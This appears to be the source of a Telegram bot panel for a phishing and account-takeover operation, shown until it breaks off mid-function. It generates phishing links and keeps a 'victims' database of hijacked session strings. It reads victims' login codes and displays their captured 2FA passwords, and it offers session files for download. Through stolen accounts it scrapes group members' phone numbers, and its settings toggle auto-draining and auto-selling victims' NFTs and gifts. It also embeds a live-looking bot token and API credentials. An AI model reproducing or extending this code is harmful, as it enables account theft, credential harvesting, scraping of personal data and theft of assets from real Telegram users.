# language: Python 3.10+, file: main.py, target: asyncio, Railway/VPS
# deps: pip install aiogram aiohttp telethon pyrogram tgcrypto

import asyncio
import logging
import os
import random
import string
import time
import json
import re
import sys

import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties

# Telethon
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    AuthKeyUnregisteredError,
    UserDeactivatedBanError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError,
    ChatAdminRequiredError,
)

# Pyrogram
try:
    from pyrogram import Client as PyroClient
    from pyrogram.errors import SessionPasswordNeeded as Pyro2FA, PhoneCodeInvalid as PyroInvalidCode
    PYRO_AVAILABLE = True
except ImportError:
    PYRO_AVAILABLE = False

LOG_FILE = "bot.log"

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
    ],
)
log = logging.getLogger("main")

logging.getLogger("telethon").setLevel(logging.WARNING)
logging.getLogger("aiohttp").setLevel(logging.WARNING)
logging.getLogger("aiogram").setLevel(logging.INFO)

def logd(tag: str, msg: str): log.debug(f"[{tag}] {msg}")
def logi(tag: str, msg: str): log.info(f"[{tag}] {msg}")
def logw(tag: str, msg: str): log.warning(f"[{tag}] {msg}")
def loge(tag: str, msg: str): log.error(f"[{tag}] {msg}")

BOT_TOKEN = "8858046564:AAFjxsGfwL-L114sJhuKuyBrK7DaarXroQw"
OWNER_ID = 8944641597
API_KEY = "frhyfryvrjjcrjvr"
API_ID = 35895947
API_HASH = "41e4f36cc045556849426e9a88ded0ca"
SERVICE_ACCOUNT_ID = 777000
TEST_PHONE = "+79935982819"

SESSIONS_DIR  = "sessions"
VICTIMS_FILE  = "victims.json"
ADMINS_FILE   = "admins.json"
VIPS_FILE     = "vips.json"
LINKS_FILE    = "links.json"
SETTINGS_FILE = "settings.json"
os.makedirs(SESSIONS_DIR, exist_ok=True)

STATE   = {}
VICTIMS = {}
ADMINS  = {}
VIPS    = {}
LINKS   = {}
SETTINGS = {}

MOBILE_DEVICES_POOL = [
    {"brand": "Samsung", "model": "Galaxy S24 Ultra", "os": "Android 14", "sdk": 34, "app": "10.8.0"},
    {"brand": "Xiaomi", "model": "Redmi Note 13 Pro", "os": "Android 13", "sdk": 33, "app": "10.9.0"},
    {"brand": "Google", "model": "Pixel 8 Pro", "os": "Android 14", "sdk": 34, "app": "10.10.1"},
    {"brand": "Apple", "model": "iPhone 15 Pro Max", "os": "iOS 17.2", "sdk": 17, "app": "10.8.3"},
]

def generate_unique_device():
    dev = random.choice(MOBILE_DEVICES_POOL)
    rand_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return {
        "device_model": f"{dev['brand']} {dev['model']}",
        "system_version": f"{dev['os']} (SDK: {dev['sdk']}-{rand_suffix})",
        "app_version": dev["app"],
        "lang_code": random.choice(["ru", "en"]),
        "system_lang_code": random.choice(["ru-RU", "en-US"])
    }

def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return default
    return default

def save_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except:
        pass

def load_all():
    global VICTIMS, ADMINS, VIPS, LINKS, SETTINGS
    VICTIMS = load_json(VICTIMS_FILE, {})
    ADMINS  = load_json(ADMINS_FILE, {})
    VIPS    = load_json(VIPS_FILE, {})
    LINKS   = load_json(LINKS_FILE, {})
    SETTINGS = load_json(SETTINGS_FILE, {
        "lang": "ru", 
        "auto_sell_threshold": 15, 
        "bulk_portion": 50,
        "provider": "telethon",
        "base_url": "", 
        "auto_transfer_nft": True,
        "auto_sell_nft": True
    })

def save_settings(): save_json(SETTINGS_FILE, SETTINGS)
def save_victims(): save_json(VICTIMS_FILE, VICTIMS)
def save_admins():  save_json(ADMINS_FILE, ADMINS)
def save_vips():    save_json(VIPS_FILE, VIPS)
def save_links():   save_json(LINKS_FILE, LINKS)

load_all()

def is_owner(uid: int) -> bool: return uid == OWNER_ID
def is_admin(uid: int) -> bool: return uid == OWNER_ID or str(uid) in ADMINS
def is_vip(uid: int)   -> bool: return is_admin(uid) or str(uid) in VIPS

def get_lang(): return SETTINGS.get("lang", "ru")

LANG = {
    "ru": {
        "access_denied": "⛔ Нет доступа.",
        "panel": "🎛 <b>Панель управления</b>",
        "victims": "👥 Жертвы",
        "sessions": "🟢 Сессии",
        "stats": "📊 Статистика",
        "new_link": "🔗 Создать ссылку",
        "parsing": "📥 Парсинг групп",
        "settings": "⚙️ Настройки и Провайдер",
        "refresh_codes": "🔄 Обновить коды",
        "check_all": "✅ Проверить все",
        "test_code": "🧪 Тест кода",
        "clear_all": "🗑 Очистить всё",
        "shutdown": "🔴 Выключить бота",
        "menu_btn": "◀️ Меню",
        "back_btn": "◀️ Назад",
        "list_empty": "📋 Список пуст",
        "no_sessions": "🟢 Нет активных сессий",
    },
    "eu": {
        "access_denied": "⛔ Access denied.",
        "panel": "🎛 <b>Control Panel</b>",
        "victims": "👥 Victims",
        "sessions": "🟢 Sessions",
        "stats": "📊 Statistics",
        "new_link": "🔗 Create Link",
        "parsing": "📥 Group Parsing",
        "settings": "⚙️ Settings & Provider",
        "refresh_codes": "🔄 Refresh Codes",
        "check_all": "✅ Check All",
        "test_code": "🧪 Test Code",
        "clear_all": "🗑 Clear All",
        "shutdown": "🔴 Shutdown Bot",
        "menu_btn": "◀️ Menu",
        "back_btn": "◀️ Back",
        "list_empty": "📋 List is empty",
        "no_sessions": "🟢 No active sessions",
    }
}

def t(key):
    l = get_lang()
    return LANG.get(l, LANG["ru"]).get(key, key)

def save_session_file(vid, data):
    p = os.path.join(SESSIONS_DIR, f"{vid}.session")
    with open(p, "wb") as f:
        f.write(data.encode() if isinstance(data, str) else data)
    return p

def load_session_file(vid):
    p = os.path.join(SESSIONS_DIR, f"{vid}.session")
    if os.path.exists(p):
        with open(p, "rb") as f:
            return f.read().decode(errors="ignore")
    return None

def delete_session_file(vid):
    p = os.path.join(SESSIONS_DIR, f"{vid}.session")
    if os.path.exists(p): os.remove(p)

def humanize_since(ts_str):
    if not ts_str: return "—"
    try:
        t_val = time.mktime(time.strptime(ts_str, "%Y-%m-%d %H:%M:%S"))
    except:
        return "—"
    delta = max(0, int(time.time() - t_val))
    d, rem = divmod(delta, 86400)
    h, rem = divmod(rem, 3600)
    m, s   = divmod(rem, 60)
    parts = []
    if d: parts.append(f"{d}д")
    if h: parts.append(f"{h}ч")
    if m: parts.append(f"{m}м")
    if not parts: parts.append(f"{s}с")
    return " ".join(parts)

def clean_phone(raw: str) -> str:
    return "+" + re.sub(r"\D", "", raw)

def active_sessions():
    return [
        (vid, v) for vid, v in VICTIMS.items()
        if os.path.exists(os.path.join(SESSIONS_DIR, f"{vid}.session"))
        and v.get("valid") is not False
    ]

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher()
routes = web.RouteTableDef()

def check_key(req):
    return req.query.get("key") == API_KEY or req.headers.get("X-Api-Key") == API_KEY

async def tg_send(chat_id, text, reply_markup=None):
    async with aiohttp.ClientSession() as s:
        payload = {"chat_id": str(chat_id), "text": text, "parse_mode": "HTML"}
        if reply_markup:
            payload["reply_markup"] = reply_markup.model_dump()
        await s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)

async def tg_send_all_admins(text):
    targets = set([OWNER_ID] + [int(uid) for uid in ADMINS.keys()])
    for tid in targets:
        try: await tg_send(tid, text)
        except: pass

async def tg_send_file(chat_id, path, caption):
    async with aiohttp.ClientSession() as s:
        with open(path, "rb") as f:
            form = aiohttp.FormData()
            form.add_field("chat_id",  str(chat_id))
            form.add_field("caption",  caption)
            form.add_field("document", f, filename=os.path.basename(path))
            await s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", data=form)

async def resolve_name(user_id):
    try:
        chat = await bot.get_chat(int(user_id))
        fn   = chat.first_name or ""
        ln   = chat.last_name  or ""
        nm   = f"{fn} {ln}".strip()
        return nm or (chat.username and f"@{chat.username}") or str(user_id)
    except:
        return None

async def make_link(creator_id):
    base = SETTINGS.get("base_url", "").strip().rstrip("/")
    if not base:
        d = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
        base = f"https://{d}" if d else "http://localhost:8080"
    
    rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    vid = f"{creator_id}_{rand}{int(time.time())}"
    name = await resolve_name(creator_id) or "Admin"
    
    LINKS[vid] = {
        "creator_id": int(creator_id), 
        "creator_name": name, 
        "created": time.time()
    }
    save_links()
    return f"{base}/tg.html?id={vid}", vid

async def check_session_valid(vid):
    session_str = load_session_file(vid)
    if not session_str:
        if vid in VICTIMS:
            VICTIMS[vid]["valid"] = False; VICTIMS[vid]["me"] = None; save_victims()
        return False
    
    prov = SETTINGS.get("provider", "telethon")
    dev = generate_unique_device()
    try:
        if prov == "pyrogram" and PYRO_AVAILABLE:
            async with PyroClient(f"pyro_{vid}", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"]) as app:
                me = await app.get_me()
                if me:
                    VICTIMS.setdefault(vid, {})["valid"] = True
                    VICTIMS[vid]["me"] = {"id": me.id, "first_name": me.first_name or "", "username": me.username or "", "phone": me.phone_number or ""}
                else:
                    VICTIMS.setdefault(vid, {})["valid"] = False; VICTIMS[vid]["me"] = None
                save_victims()
                return VICTIMS[vid]["valid"]
        else:
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"], system_lang_code=dev["system_lang_code"])
            await client.connect()
            me = await client.get_me()
            await client.disconnect()
            if me:
                VICTIMS.setdefault(vid, {})["valid"] = True
                VICTIMS[vid]["me"] = {"id": me.id, "first_name": me.first_name or "", "username": me.username or "", "phone": me.phone or ""}
            else:
                VICTIMS.setdefault(vid, {})["valid"] = False; VICTIMS[vid]["me"] = None
            save_victims()
            return VICTIMS[vid]["valid"]
    except Exception as e:
        VICTIMS.setdefault(vid, {})["valid"] = False
        save_victims()
        return False

async def terminate_session(vid):
    session_str = load_session_file(vid)
    if session_str:
        try:
            dev = generate_unique_device()
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"])
            await client.connect()
            await client.log_out()
            await client.disconnect()
        except:
            pass
    delete_session_file(vid)
    if vid in VICTIMS:
        VICTIMS[vid]["valid"] = False
        VICTIMS[vid]["terminated"] = time.strftime("%Y-%m-%d %H:%M:%S")
        save_victims()
    return True

async def fetch_victim_codes(vid):
    if vid not in VICTIMS: return
    session_str = load_session_file(vid)
    if not session_str: return
    try:
        dev = generate_unique_device()
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"])
        await client.connect()
        messages = await client.get_messages(SERVICE_ACCOUNT_ID, limit=5)
        for msg in messages:
            if msg.text:
                codes = re.findall(r"\b\d{5,6}\b", msg.text)
                if codes:
                    VICTIMS[vid]["last_code"] = codes[0]
                    break
        VICTIMS[vid]["updated"] = time.strftime("%H:%M:%S")
        save_victims()
        await client.disconnect()
    except:
        pass

def main_menu(user_id):
    kb = [
        [InlineKeyboardButton(text=t("victims"), callback_data="victims_list"),
         InlineKeyboardButton(text=t("sessions"), callback_data="sessions_list")],
        [InlineKeyboardButton(text=t("stats"), callback_data="stats"),
         InlineKeyboardButton(text=t("new_link"), callback_data="new_link")],
        [InlineKeyboardButton(text=t("parsing"), callback_data="parsing_menu"),
         InlineKeyboardButton(text=t("settings"), callback_data="settings_menu")],
    ]
    if is_admin(user_id):
        kb.extend([
            [InlineKeyboardButton(text=t("refresh_codes"), callback_data="refresh_all"),
             InlineKeyboardButton(text=t("check_all"), callback_data="check_all_valid")],
            [InlineKeyboardButton(text=t("test_code"), callback_data="test_code_send"),
             InlineKeyboardButton(text=t("clear_all"), callback_data="clear_all_confirm")],
            [InlineKeyboardButton(text=t("shutdown"), callback_data="shutdown_confirm")],
        ])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def victims_list_menu(page=0):
    items = list(VICTIMS.items())
    per_page = 8
    total = max(1, (len(items) + per_page - 1) // per_page)
    page = max(0, min(page, total - 1))
    chunk = items[page * per_page:(page + 1) * per_page]
    buttons = []
    for vid, info in chunk:
        phone = info.get("phone", "unknown")
        valid = info.get("valid")
        mark = "✅" if valid is True else ("❌" if valid is False else "❓")
        fa = "🔐" if info.get("has_2fa") else "📱"
        buttons.append([InlineKeyboardButton(text=f"{mark} {fa} {phone}", callback_data=f"victim_{vid}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="◀️", callback_data=f"vp_{page-1}"))
    if page < total - 1: nav.append(InlineKeyboardButton(text="▶️", callback_data=f"vp_{page+1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def sessions_list_menu(page=0):
    items = active_sessions()
    per_page = 8
    total = max(1, (len(items) + per_page - 1) // per_page)
    page = max(0, min(page, total - 1))
    chunk = items[page * per_page:(page + 1) * per_page]
    buttons = []
    for vid, info in chunk:
        phone = info.get("phone", "unknown")
        dur = humanize_since(info.get("harvested"))
        buttons.append([InlineKeyboardButton(text=f"🟢 {phone}  ⏱ {dur}", callback_data=f"sess_{vid}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="◀️", callback_data=f"sp_{page-1}"))
    if page < total - 1: nav.append(InlineKeyboardButton(text="▶️", callback_data=f"sp_{page+1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def victim_detail_menu(vid):
    info = VICTIMS.get(vid, {})
    valid = info.get("valid")
    vbtn = "✅ Валидна" if valid is True else ("❌ Не валидна" if valid is False else "⚠️ Проверить")
    has_file = os.path.exists(os.path.join(SESSIONS_DIR, f"{vid}.session"))
    fa = "🔐" if info.get("has_2fa") else "🔓"
    
    rows = [
        [InlineKeyboardButton(text="📨 Показать код", callback_data=f"show_code_{vid}"),
         InlineKeyboardButton(text=f"{fa} Показать 2FA", callback_data=f"show_2fa_{vid}")],
        [InlineKeyboardButton(text="🔄 Обновить код", callback_data=f"fetch_{vid}"),
         InlineKeyboardButton(text="📁 Скачать сессию", callback_data=f"dl_{vid}")],
        [InlineKeyboardButton(text=vbtn, callback_data=f"chk_{vid}")],
    ]
    if has_file and valid is not False:
        rows.append([InlineKeyboardButton(text="🛑 Завершить сессию (Кик)", callback_data=f"kill_{vid}")])
    rows.append([InlineKeyboardButton(text="📋 Номер телефона", callback_data=f"copy_phone_{vid}")])
    rows.append([InlineKeyboardButton(text="🗑 Удалить из базы", callback_data=f"delc_{vid}"),
                 InlineKeyboardButton(text=t("back_btn"), callback_data="victims_list")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def settings_menu():
    thresh = SETTINGS.get("auto_sell_threshold", 15)
    bulk = SETTINGS.get("bulk_portion", 50)
    cur_lang = SETTINGS.get("lang", "ru").upper()
    prov = SETTINGS.get("provider", "telethon").capitalize()
    transfer_nft = "✅ Вкл" if SETTINGS.get("auto_transfer_nft", True) else "❌ Выкл"
    sell_nft = "✅ Вкл" if SETTINGS.get("auto_sell_nft", True) else "❌ Выкл"
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"🌐 Language: {cur_lang}", callback_data="toggle_lang")],
        [InlineKeyboardButton(text=f"⚙️ Provider: {prov}", callback_data="toggle_provider")],
        [InlineKeyboardButton(text=f"📤 Автослив NFT/Подарков: {transfer_nft}", callback_data="toggle_transfer_nft")],
        [InlineKeyboardButton(text=f"💰 Автопродажа NFT: {sell_nft}", callback_data="toggle_sell_nft")],
        [InlineKeyboardButton(text=f"⭐ Stars Threshold (< {thresh})", callback_data="set_thresh")],
        [InlineKeyboardButton(text=f"🎁 Bulk Portion ({bulk})", callback_data="set_bulk")],
        [InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")],
    ])

def del_confirm_menu(vid):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да, удалить", callback_data=f"deld_{vid}"),
        InlineKeyboardButton(text="❌ Отмена", callback_data=f"victim_{vid}"),
    ]])

def clear_all_confirm_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да, очистить всё", callback_data="clear_all_do"),
        InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu"),
    ]])

def shutdown_confirm_menu():
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да, выключить", callback_data="shutdown_do"),
        InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu"),
    ]])

@dp.message(Command("ru"))
async def cmd_ru(msg: Message):
    if not is_vip(msg.from_user.id): return
    SETTINGS["lang"] = "ru"
    save_settings()
    await msg.answer("🌐 Язык переключен на русский.", reply_markup=main_menu(msg.from_user.id))

@dp.message(Command("eu"))
async def cmd_eu(msg: Message):
    if not is_vip(msg.from_user.id): return
    SETTINGS["lang"] = "eu"
    save_settings()
    await msg.answer("🌐 Language switched to English.", reply_markup=main_menu(msg.from_user.id))

@dp.message(Command("start"))
async def cmd_start(msg: Message):
    if not is_vip(msg.from_user.id): return await msg.answer(t("access_denied"))
    await msg.answer(t("panel"), reply_markup=main_menu(msg.from_user.id))

@dp.message(Command("menu"))
async def cmd_menu(msg: Message):
    if not is_vip(msg.from_user.id): return
    await msg.answer(t("panel"), reply_markup=main_menu(msg.from_user.id))

@dp.message(Command("stats"))
async def cmd_stats(msg: Message):
    if not is_vip(msg.from_user.id): return
    await msg.answer(build_stats_text())

@dp.message(Command("victims"))
async def cmd_victims(msg: Message):
    if not is_vip(msg.from_user.id): return
    if not VICTIMS: return await msg.answer(t("list_empty"))
    await msg.answer(f"👥 <b>Жертвы</b> ({len(VICTIMS)}):", reply_markup=victims_list_menu(0))

@dp.message(Command("sessions"))
async def cmd_sessions(msg: Message):
    if not is_vip(msg.from_user.id): return
    items = active_sessions()
    if not items: return await msg.answer(t("no_sessions"))
    await msg.answer(f"🟢 <b>Активные сессии</b> ({len(items)}):", reply_markup=sessions_list_menu(0))

@dp.message(Command("url"))
async def cmd_url(msg: Message):
    if not is_admin(msg.from_user.id): return await msg.answer("⛔ Только для администраторов.")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        curr_base = SETTINGS.get("base_url", "Не задана")
        return await msg.answer(f"🌐 Текущая базовая ссылка: <code>{curr_base}</code>\n\nИспользование: <code>/url https://ваш-домен.com</code>")
    
    new_url = args[1].strip().rstrip("/")
    SETTINGS["base_url"] = new_url
    save_settings()
    await msg.answer(f"✅ Базовая ссылка успешно установлена:\n<code>{new_url}</code>")

@dp.message(Command("addadmin"))
async def cmd_addadmin(msg: Message):
    if not is_owner(msg.from_user.id): return await msg.answer("⛔ Только владелец может добавлять администраторов.")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer("Использование: <code>/addadmin Telegram_ID</code>")
    target = args[1].strip()
    if not target.lstrip("-").isdigit():
        return await msg.answer("❌ Ошибка: ID должен состоять только из цифр.")
    
    ADMINS[target] = {"added": time.strftime("%Y-%m-%d %H:%M:%S")}
    save_json(ADMINS_FILE, ADMINS)
    await msg.answer(f"✅ Пользователь с ID <code>{target}</code> успешно назначен администратором!")

PARSING_STATE = {}

@dp.callback_query(F.data == "new_link")
async def cb_new_link(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return await cb.answer("⛔ Нет доступа", show_alert=True)
    link, _ = await make_link(cb.from_user.id)
    await cb.message.answer(f"🔗 <b>Ваша персональная ссылка:</b>\n<code>{link}</code>")
    await cb.answer("Ссылка создана!")

@dp.callback_query(F.data == "settings_menu")
async def cb_settings_menu(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    base = SETTINGS.get("base_url", "Не задана")
    await cb.message.edit_text(t("settings_title") + f"\n\n🌐 Базовый URL: <code>{base}</code>\n(Изменить: /url ссылка)", reply_markup=settings_menu())

@dp.callback_query(F.data == "toggle_lang")
async def cb_toggle_lang(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    SETTINGS["lang"] = "eu" if SETTINGS.get("lang", "ru") == "ru" else "ru"
    save_settings()
    await cb.message.edit_text(t("settings_title"), reply_markup=settings_menu())

@dp.callback_query(F.data == "toggle_provider")
async def cb_toggle_provider(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    curr = SETTINGS.get("provider", "telethon")
    new_prov = "pyrogram" if curr == "telethon" else "telethon"
    if new_prov == "pyrogram" and not PYRO_AVAILABLE:
        return await cb.answer("❌ Pyrogram не установлен", show_alert=True)
    SETTINGS["provider"] = new_prov
    save_settings()
    await cb.answer(f"Provider switched to {new_prov.upper()}", show_alert=True)
    await cb.message.edit_text(t("settings_title"), reply_markup=settings_menu())

@dp.callback_query(F.data == "toggle_transfer_nft")
async def cb_toggle_transfer_nft(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    SETTINGS["auto_transfer_nft"] = not SETTINGS.get("auto_transfer_nft", True)
    save_settings()
    await cb.message.edit_text(t("settings_title"), reply_markup=settings_menu())

@dp.callback_query(F.data == "toggle_sell_nft")
async def cb_toggle_sell_nft(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    SETTINGS["auto_sell_nft"] = not SETTINGS.get("auto_sell_nft", True)
    save_settings()
    await cb.message.edit_text(t("settings_title"), reply_markup=settings_menu())

@dp.callback_query(F.data == "set_thresh")
async def cb_set_thresh(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    curr = SETTINGS.get("auto_sell_threshold", 15)
    SETTINGS["auto_sell_threshold"] = 30 if curr == 15 else 15
    save_settings()
    await cb.message.edit_text(t("settings_title"), reply_markup=settings_menu())

@dp.callback_query(F.data == "set_bulk")
async def cb_set_bulk(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    curr = SETTINGS.get("bulk_portion", 50)
    SETTINGS["bulk_portion"] = 100 if curr == 50 else 50
    save_settings()
    await cb.message.edit_text(t("settings_title"), reply_markup=settings_menu())

@dp.callback_query(F.data == "test_code_send")
async def cb_test_code_send(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("⛔ Admins only", show_alert=True)
    await cb.answer("⏳ Отправка тестового кода...")
    prov = SETTINGS.get("provider", "telethon")
    dev = generate_unique_device()
    try:
        if prov == "pyrogram" and PYRO_AVAILABLE:
            async with PyroClient("pyro_test", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"]) as app:
                await app.send_code(TEST_PHONE)
            await cb.message.answer(f"✅ <b>Pyrogram тест успешен!</b>\n📱 Код отправлен на <code>{TEST_PHONE}</code>")
        else:
            client = TelegramClient(StringSession(""), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"], system_lang_code=dev["system_lang_code"])
            await client.connect()
            await client.send_code_request(TEST_PHONE)
            await client.disconnect()
            await cb.message.answer(f"✅ <b>Telethon тест успешен!</b>\n📱 Код отправлен на <code>{TEST_PHONE}</code>")
    except Exception as e:
        await cb.message.answer(f"❌ <b>Ошибка теста:</b>\n<code>{e}</code>")

# --- БЕЗОПАСНЫЙ ПАРСИНГ VID ЧЕРЕЗ СРЕЗЫ ---
@dp.callback_query(F.data.startswith("show_code_"))
async def cb_show_code(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("show_code_"):]
    info = VICTIMS.get(vid, {})
    code = info.get("last_code", "Не поступал")
    await cb.answer(f"Последний код: {code}", show_alert=True)

@dp.callback_query(F.data.startswith("show_2fa_"))
async def cb_show_2fa(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("show_2fa_"):]
    info = VICTIMS.get(vid, {})
    fa_pass = info.get("last_2fa", "Отсутствует / Не вводился")
    await cb.answer(f"2FA Пароль: {fa_pass}", show_alert=True)

@dp.callback_query(F.data.startswith("copy_phone_"))
async def cb_copy_phone(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("copy_phone_"):]
    info = VICTIMS.get(vid, {})
    phone = info.get("phone", "Не указан")
    await cb.answer(f"Номер телефона: {phone}", show_alert=True)

@dp.callback_query(F.data == "parsing_menu")
async def cb_parsing_menu(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return await cb.answer("⛔ VIP required", show_alert=True)
    items = active_sessions()
    if not items:
        return await cb.message.edit_text("❌ Нет активных сессий для парсинга.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")]]))
    
    buttons = []
    for vid, info in items:
        phone = info.get("phone", "unknown")
        buttons.append([InlineKeyboardButton(text=f"📱 {phone}", callback_data=f"parse_sel_{vid}")])
    buttons.append([InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")])
    await cb.message.edit_text("📥 <b>Выберите сессию для парсинга групп:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@dp.callback_query(F.data.startswith("parse_sel_"))
async def cb_parse_select_session(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    vid = cb.data[len("parse_sel_"):]
    PARSING_STATE[cb.from_user.id] = {"vid": vid}
    
    session_str = load_session_file(vid)
    if not session_str: return await cb.answer("Сессия не найдена!", show_alert=True)
    
    await cb.answer("⏳ Подключение и поиск групп...")
    prov = SETTINGS.get("provider", "telethon")
    dev = generate_unique_device()
    try:
        dialogs = []
        if prov == "pyrogram" and PYRO_AVAILABLE:
            async with PyroClient(f"pyro_parse_{vid}", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"]) as app:
                async for dialog in app.get_dialogs(limit=50):
                    chat_type = str(dialog.chat.type)
                    if "GROUP" in chat_type.upper() or "SUPERGROUP" in chat_type.upper():
                        dialogs.append({"id": dialog.chat.id, "title": dialog.chat.title or "Group"})
        else:
            client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"], system_lang_code=dev["system_lang_code"])
            await client.connect()
            raw_dialogs = await client.get_dialogs(limit=50)
            for d in raw_dialogs:
                if getattr(d.entity, 'megagroup', False) or getattr(d.entity, 'broadcast', False) is False and d.is_group:
                    dialogs.append({"id": d.id, "title": d.title})
            await client.disconnect()
        
        if not dialogs:
            return await cb.message.edit_text("❌ У этого аккаунта нет доступных групп.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")]]))

        chat_buttons = []
        PARSING_STATE[cb.from_user.id]["dialogs"] = {}
        for idx, dialog in enumerate(dialogs):
            PARSING_STATE[cb.from_user.id]["dialogs"][idx] = {"id": dialog["id"], "title": dialog["title"]}
            chat_buttons.append([InlineKeyboardButton(text=f"👥 {dialog['title'][:30]}", callback_data=f"parse_chat_{idx}")])
        
        chat_buttons.append([InlineKeyboardButton(text=t("back_btn"), callback_data="parsing_menu")])
        await cb.message.edit_text("📁 <b>Выберите группу для парсинга участников:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=chat_buttons))
    except Exception as e:
        await cb.message.edit_text(f"❌ Ошибка: <code>{e}</code>", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")]]))

@dp.callback_query(F.data.startswith("parse_chat_"))
async def cb_parse_select_chat(cb: CallbackQuery):
    if not is_vip(cb.from_user.id): return
    idx = int(cb.data[len("parse_chat_"):])
    state = PARSING_STATE.get(cb.from_user.id)
    if not state or "dialogs" not in state or idx not in state["dialogs"]:
        return await cb.answer("Сессия истекла.", show_alert=True)
    
    chat_info = state["dialogs"][idx]
    vid = state["vid"]
    session_str = load_session_file(vid)
    dev = generate_unique_device()
    
    await cb.answer("⏳ Парсинг участников группы...")
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"])
        await client.connect()
        users_data = []
        try:
            async for user in client.iter_participants(chat_info["id"], limit=200):
                users_data.append({
                    "id": user.id,
                    "username": user.username or "",
                    "first_name": user.first_name or "",
                    "phone": getattr(user, "phone", None) or "hidden"
                })
        except ChatAdminRequiredError:
            await client.disconnect()
            return await cb.message.edit_text("❌ Ошибка: Нужны права администратора в этой группе для экспорта участников.", reply_markup=main_menu(cb.from_user.id))
        await client.disconnect()

        file_data = json.dumps(users_data, indent=2, ensure_ascii=False).encode("utf-8")
        doc = BufferedInputFile(file_data, filename=f"group_members_{chat_info['id']}.json")
        await cb.message.answer_document(doc, caption=f"👥 Участники группы: {chat_info['title']} ({len(users_data)})")
        await cb.message.edit_text("✅ Парсинг группы успешно завершен!", reply_markup=main_menu(cb.from_user.id))
    except Exception as e:
